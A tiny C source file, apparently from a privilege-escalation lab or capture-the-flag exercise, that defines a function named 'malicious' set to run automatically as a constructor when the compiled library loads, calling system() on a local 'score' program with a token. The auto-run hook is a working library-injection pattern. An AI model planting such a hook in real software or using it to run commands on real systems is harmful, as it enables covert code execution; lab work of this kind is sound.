#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	system("/usr/local/bin/score aa73ea10-5f48-4dcd-be7d-770acec7917c"); 
}
